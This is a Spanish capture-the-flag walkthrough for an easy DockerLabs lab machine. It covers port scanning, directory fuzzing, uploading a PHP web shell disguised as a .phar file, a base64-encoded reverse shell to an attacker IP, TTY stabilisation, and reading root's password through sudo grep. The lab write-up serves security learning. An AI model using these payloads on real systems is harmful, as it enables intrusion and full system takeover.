Maquina: DockerLabs

Autor: El Pinguino de Mario

Dificultad: Facil

ping 172.17.0.2 -c 1

sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

Accederemos a la página web

172.17.0.2

Aplicar Fuzzing para descubrir rutas y archivos con extensiones

gobuster dirb -t 150 -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

Accedemos al archivo machine.php y descubrimos una página web que permite la subida de archivos

Intentamos subir un archivo que contenga código PHP para ejecutar comandos a nivel del sistema

Creamos un archivo llamado pwned.phar que incluye el siguiente código, lo cual nos permite ejecutar comandos del sistema al enviar un parámetro llamado cmd

<?php
    system($_GET'cmd');
?>

Subimos el archivo .phar y confirmaremos que se ha cargado correctamente

172.17.0.2/upload.php

si cargamos el archivo .phar y enviamos comandos a través del parámetro cmd, podremos ejecutar dichos comandos

Ahora, necesitamos enviar una shell inversa a nuestra máquina atacante

Primero, convertimos la shell inversa a Base64 utilizando el siguiente comando:

echo "sh -i >& /dev/tcp/172.16.1.131/4444 0>&1" | base64

Esto nos da el siguiente resultado: c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=

En nuestra máquina atacante, nos ponemos a la escucha con Netcat en el puerto 4444 utilizando el siguiente comando:

nc -nvlp 4444

Luego, en el parámetro cmd, enviamos el siguiente comando:

echo "c2ggLWkgPiYgL2Rldi90Y3AvMTcyLjE2LjEuMTMxLzQ0NDQgMD4mMQo=" | base64 -d | bash

Al ejecutar esto, obtendremos una shell inversa en nuestra máquina atacante. Así, estaremos dentro del sistema

Tratamiento de la TTY

Una vez estemos dentro ejecutamos el siguiente comando: script /dev/null -c bash

Luego presionamos: Ctrl + Z para suspender el proceso

A continuación, escribimos: stty raw -echo; fg

Despues ingresamos: reset

Cuando se nos pregunte: "Terminal type?" Ingresamos xterm.

Finalmente, exportamos las siguientes variables de entorno: export TERM=xterm export SHELL=bash

Al ejecutar sudo -l, veremos que podemos ejecutar los binarios /usr/bin/cut y /usr/bin/grep como usuario root sin necesidad de proporcionar una contraseña

Si realizamos una búsqueda de archivos .txt en el sistema utilizando el comando:

find / *.txt 2>/dev/null

veremos que hay un archivo en /opt/ llamado nota.txt

Al revisar el contenido de ese archivo, encontramos el siguiente mensaje:

Protege la clave de root, se encuentra en su directorio /root/clave.txt. Menos mal que nadie tiene permisos para acceder a ella

tenemos permisos para ejecutar los binarios grep y cut. Aprovecharemos estos permisos para leer el archivo /root/clave.txt de la siguiente manera:

sudo /usr/bin/grep '' /root/clave.txt

Leemos el archivo, encontramos una posible contraseña: dockerlabsmolamogollon123.

Cambiamos al usuario root y utilizamos la contraseña encontrada

whoami
